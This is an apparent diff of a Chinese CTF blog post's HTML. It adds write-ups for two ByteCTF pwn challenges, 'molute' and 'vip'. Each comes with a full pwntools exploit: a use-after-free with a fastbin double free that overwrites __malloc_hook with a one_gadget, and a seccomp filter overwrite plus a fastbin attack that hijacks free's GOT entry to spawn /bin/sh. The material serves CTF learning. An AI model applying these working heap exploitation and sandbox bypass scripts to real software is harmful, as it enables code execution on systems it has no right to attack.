@@ -177,11 +177,23 @@
             </div>
             <h2 class="post-title">ByteCtf-pwn复现</h2>
             <div class="post-meta">
-                本文总共343个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共2490个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
-            <h4 id="ByteCtf的部分pwn题复现"><a href="#ByteCtf的部分pwn题复现" class="headerlink" title="ByteCtf的部分pwn题复现"></a>ByteCtf的部分pwn题复现</h4><h4 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h4><ul>
+            <h4 id="ByteCtf的部分pwn题复现"><a href="#ByteCtf的部分pwn题复现" class="headerlink" title="ByteCtf的部分pwn题复现"></a>ByteCtf的部分pwn题复现</h4><h4 id="molute"><a href="#molute" class="headerlink" title="molute"></a>molute</h4><ul>
+<li><p>当时看着题目经过了混淆。。。后来仔细看过，发现并没有影响到逻辑的判断。</p>
+</li>
+<li><p>漏洞主在free中，这里free后有0xa的延迟，也就可以USE AFTER FREE</p>
+<img src="/2019/09/11/ByteCtf-pwn复现/4.png" title="[]">
+</li>
+<li><p>构成double free chains，之后再利用fastbin attack技术，字节错位覆写__malloc_hook的地址，写入gadget。</p>
+</li>
+<li><p>exp记录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x90</span>, <span class="string">'a'</span>*<span class="number">0x90</span>)		<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">'b'</span>*<span class="number">0x40</span>)		<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x40</span>)		<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">'d'</span>*<span class="number">0x40</span>)		<span class="comment">#3</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvline().strip(<span class="string">'\x0a'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">__malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base ==&gt; "</span> + hex(libc_base)</span><br><span class="line">  </span><br><span class="line"><span class="comment">#use after free make a double free chain</span></span><br><span class="line"><span class="comment">#	2-&gt;3-&gt;2-&gt;fake_chunk</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line">create(<span class="number">0x60</span>, p64(__malloc_hook - <span class="number">0x13</span>))			<span class="comment">#chunk1' fd</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">'g'</span>*<span class="number">0x40</span>)									<span class="comment">#junk chunk</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">'k'</span>*<span class="number">0x40</span>)									<span class="comment">#junk chunk</span></span><br><span class="line">  </span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">3</span> + p64(one_gadget))</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h4><ul>
 <li><p>这道题目考察了linux沙盒安全机制，prctl的seccomp模式。相关学习链接<a href="[https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/](https://veritas501.space/2018/05/05/seccomp学习笔记/">在这里</a>)</p>
 </li>
 <li><p>漏洞很明显的堆溢出，但是输入是这样的</p>
@@ -203,7 +215,29 @@
 <li>堆溢出漏洞利用。</li>
 </ul>
 </li>
+<li><p>细节</p>
+<ul>
+<li><p>利用栈溢出，修改filter。根据是否是open函数，且filename是否是”filename”判断，是否需要返回0</p>
+<img src="/2019/09/11/ByteCtf-pwn复现/3.png" title="[]">
+</li>
+<li><p>之后利用堆溢出，因为都是malloc(0x50)的fastbin堆块，所以Fastbin attack。这里使用horse of spirit技术。</p>
+</li>
+<li><p>exp记录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">buf_rule = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">buf_rule += <span class="string">"\x20\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">buf_rule += <span class="string">"\x15\x00\x00\x03\x02\x00\x00\x00"</span></span><br><span class="line">buf_rule += <span class="string">"\x20\x00\x00\x00\x10\x00\x00\x00"</span></span><br><span class="line">buf_rule += <span class="string">"\x15\x00\x00\x01\x7e\x20\x40\x00"</span></span><br><span class="line">buf_rule += <span class="string">"\x06\x00\x00\x00\x00\x00\x05\x00"</span></span><br><span class="line">buf_rule += <span class="string">"\x06\x00\x00\x00\x00\x00\xff\x7f"</span></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line">chunk_ptr = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line">vip(buf_rule)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, 'b* 0x40176D')</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#fake the chunk1_fd</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(chunk_ptr)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret is chunk_ptr</span></span><br><span class="line">alloc(<span class="number">0x4</span>)</span><br><span class="line"><span class="comment">#chunk_ptr[0], chunk_ptr[1]</span></span><br><span class="line">edit(<span class="number">4</span>, p64(free_got) + p64(atoi_got))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">free_addr = u64(p.recvline().strip(<span class="string">'\x0a'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr ==&gt; "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
+</li>
+</ul>
+<ul>
+<li><p>拓展seccomp绕过——编写sock_filter</p>
+<ul>
+<li>利用c语言编写，自定义规则，并导出bpf.out（hex文件）</li>
+<li>seccomp-tools工具得到规则翻译</li>
+<li>简写、根据实际改写。</li>
+</ul>
+</li>
+</ul>
+<p><a href="[https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/](https://veritas501.space/2018/05/05/seccomp学习笔记/">seccomp学习</a>)</p>
 
         </div>
         <div class="post-tool">
